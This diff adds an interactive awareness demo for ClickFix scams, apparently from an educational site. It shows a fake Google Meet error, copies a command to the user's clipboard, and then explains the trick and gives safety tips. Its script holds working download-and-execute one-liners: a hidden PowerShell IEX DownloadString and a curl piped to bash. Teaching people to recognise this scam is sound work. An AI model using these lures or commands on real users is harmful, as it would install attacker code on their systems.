@@ -1,0 +1,288 @@
+---
+const baseUrl = import.meta.env.PROD
+  ? "https://clickfix.fyi"
+  : "http://localhost:4321";
+---
+
+<div class="demo-container card" id="interactive-demo" data-base-url={baseUrl}>
+  <div class="demo-setup" id="demo-start-screen">
+    <svg
+      xmlns="http://www.w3.org/2000/svg"
+      width="60"
+      height="60"
+      viewBox="0 0 24 24"
+      fill="none"
+      stroke="currentColor"
+      stroke-width="1.5"
+      stroke-linecap="round"
+      stroke-linejoin="round"
+      class="demo-icon"
+      ><circle cx="12" cy="12" r="10"></circle><path d="M12 16v-4"></path><path
+        d="M12 8h.01"></path>
+    </svg>
+    <h2>Interactive Demo</h2>
+    <p>
+      This demo will show you exactly what a ClickFix scam looks like. No actual
+      code will be run on your system.
+    </p>
+    <button class="btn btn-primary" id="start-simulation"
+      >Start Simulation</button
+    >
+  </div>
+
+  <div class="demo-stage hidden" id="demo-stage-1">
+    <div class="fake-notification">
+      <div class="notif-header">
+        <img
+          src="https://www.google.com/favicon.ico"
+          alt="Google"
+          width="16"
+          height="16"
+        />
+        <span>Google Meet</span>
+      </div>
+      <div class="notif-body">
+        <h4>Connection Error</h4>
+        <p>
+          A technical issue occurred while trying to join the meeting. Please
+          follow the steps below to fix it:
+        </p>
+        <div class="fake-instruction">
+          <p id="instruction-1">1. Open your <strong>Terminal</strong>.</p>
+          <p id="instruction-2">
+            2. Press <strong>Cmd + V</strong> (or Ctrl + V) to paste.
+          </p>
+          <p id="instruction-3">3. Press <strong>Enter</strong>.</p>
+        </div>
+        <button class="btn-fake-copy" id="fake-copy-btn" data-command=""
+          >Copy Fix Code</button
+        >
+      </div>
+    </div>
+    <div
+      class="demo-explanation card"
+      style="background: #eff6ff; border-left: 4px solid var(--accent-color);"
+    >
+      <h4>🚨 What just happened?</h4>
+      <p>
+        When you clicked "Copy Fix Code," this command was copied to your
+        clipboard (simulated):
+      </p>
+      <div class="payload-display">
+        <code id="payload-code"></code>
+      </div>
+      <p style="margin-top: 1rem;">
+        If you followed the instructions and pasted this into your <span
+          id="tool-name-explanation">Terminal</span
+        >, it would download and run a script from our server. In a real attack,
+        this would install malware that steals your passwords, cookies, and
+        cryptocurrency wallets.
+      </p>
+      <button class="btn btn-primary" id="next-step"
+        >See How to Protect Yourself</button
+      >
+    </div>
+  </div>
+
+  <div class="demo-stage hidden" id="demo-stage-final">
+    <h2>How to Protect Yourself</h2>
+    <ul class="safety-list">
+      <li>
+        <strong>Never</strong> paste commands from a website into your system tools.
+      </li>
+      <li>
+        <strong>Verify</strong> the source. Real software doesn't fix itself this
+        way.
+      </li>
+      <li>
+        <strong>Report</strong> these sites to search engines and security providers.
+      </li>
+      <li>
+        <strong>Educate</strong> others. Share this resource with friends and colleagues.
+      </li>
+    </ul>
+    <button class="btn btn-primary" id="reset-demo">Back to Start</button>
+  </div>
+</div>
+
+<style>
+  .demo-container {
+    max-width: 800px;
+    margin: 2rem auto;
+    padding: 3.5rem;
+    text-align: center;
+  }
+  .hidden {
+    display: none;
+  }
+  .demo-icon {
+    margin-bottom: 1rem;
+    color: var(--accent-color);
+  }
+
+  .fake-notification {
+    max-width: 400px;
+    margin: 0 auto 2.5rem;
+    text-align: left;
+    background: #ffffff;
+    color: #1a1a1a;
+    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+    border: 1px solid #e5e7eb;
+    border-radius: 8px;
+    overflow: hidden;
+  }
+  .notif-header {
+    background: #f1f3f4;
+    padding: 0.6rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+    font-size: 0.85rem;
+    font-weight: 600;
+  }
+  .notif-body {
+    padding: 1.75rem;
+  }
+  .notif-body h4 {
+    margin-top: 0;
+    color: #d93025;
+    margin-bottom: 0.75rem;
+  }
+  .fake-instruction {
+    background: #f8f9fa;
+    padding: 1.25rem;
+    border-radius: 6px;
+    margin: 1.25rem 0;
+    font-size: 0.95rem;
+    border: 1px dashed #cbd5e1;
+  }
+  .btn-fake-copy {
+    width: 100%;
+    background: #1a73e8;
+    color: white;
+    border: none;
+    padding: 0.75rem;
+    border-radius: 4px;
+    font-weight: 600;
+    cursor: pointer;
+  }
+
+  .demo-explanation {
+    text-align: left;
+    padding: 1.5rem;
+    margin-top: 2rem;
+  }
+  .demo-explanation h4 {
+  }
+
+  .payload-display {
+    background: #1f2937;
+    padding: 1rem;
+    border-radius: 4px;
+    margin: 1rem 0;
+    overflow-x: auto;
+  }
+
+  .payload-display code {
+    font-family: "Courier New", monospace;
+    font-size: 0.85rem;
+    color: #10b981;
+    word-break: break-all;
+    white-space: pre-wrap;
+    color: var(--accent-color);
+    margin-top: 0;
+  }
+
+  .safety-list {
+    text-align: left;
+    margin: 2.5rem auto;
+    max-width: 500px;
+    padding-left: 1.5rem;
+  }
+  .safety-list li {
+    margin-bottom: 1.25rem;
+  }
+</style>
+
+<script>
+  const demoContainer = document.getElementById("interactive-demo");
+  const startBtn = document.getElementById("start-simulation");
+  const nextBtn = document.getElementById("next-step");
+  const resetBtn = document.getElementById("reset-demo");
+  const copyBtn = document.getElementById("fake-copy-btn") as HTMLButtonElement;
+
+  const startScreen = document.getElementById("demo-start-screen");
+  const stage1 = document.getElementById("demo-stage-1");
+  const stageFinal = document.getElementById("demo-stage-final");
+
+  const instr1 = document.getElementById("instruction-1");
+  const instr2 = document.getElementById("instruction-2");
+  const payloadCode = document.getElementById("payload-code");
+  const toolNameExpl = document.getElementById("tool-name-explanation");
+
+  // OS Detection and Configuration
+  const baseUrl = demoContainer?.dataset.baseUrl || "";
+  const isWindows = navigator.platform.toLowerCase().indexOf("win") > -1;
+
+  const configs = {
+    windows: {
+      command: `powershell -windowstyle hidden -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('${baseUrl}/static/example.ps1')"`,
+      instructions: [
+        "1. Press <strong>Win + R</strong> on your keyboard.",
+        "2. Right-click in the box and <strong>Paste</strong>.",
+      ],
+      toolName: "Windows Run dialog",
+    },
+    unix: {
+      command: `curl -s ${baseUrl}/static/example.sh | bash`,
+      instructions: [
+        "1. Open your <strong>Terminal</strong>.",
+        "2. Press <strong>Cmd + V</strong> (or Ctrl + V) to paste.",
+      ],
+      toolName: "Terminal",
+    },
+  };
+
+  const current = isWindows ? configs.windows : configs.unix;
+
+  // Initialize UI with OS-specific content
+  if (instr1) instr1.innerHTML = current.instructions[0];
+  if (instr2) instr2.innerHTML = current.instructions[1];
+  if (copyBtn) copyBtn.setAttribute("data-command", current.command);
+  if (payloadCode) payloadCode.innerText = current.command;
+  if (toolNameExpl) toolNameExpl.innerText = current.toolName;
+
+  startBtn?.addEventListener("click", () => {
+    startScreen?.classList.add("hidden");
+    stage1?.classList.remove("hidden");
+  });
+
+  copyBtn?.addEventListener("click", async () => {
+    const command = copyBtn.getAttribute("data-command");
+    if (command) {
+      try {
+        await navigator.clipboard.writeText(command);
+        copyBtn.innerText = "Copied!";
+        copyBtn.style.background = "#0d652d";
+      } catch (err) {
+        console.error("Failed to copy:", err);
+        copyBtn.innerText = "Copy Failed";
+        copyBtn.style.background = "#dc2626";
+      }
+    }
+  });
+
+  nextBtn?.addEventListener("click", () => {
+    stage1?.classList.add("hidden");
+    stageFinal?.classList.remove("hidden");
+  });
+
+  resetBtn?.addEventListener("click", () => {
+    stageFinal?.classList.add("hidden");
+    startScreen?.classList.remove("hidden");
+    if (copyBtn) {
+      copyBtn.innerText = "Copy Fix Code";
+      copyBtn.style.background = "#1a73e8";
+    }
+  });
+</script>
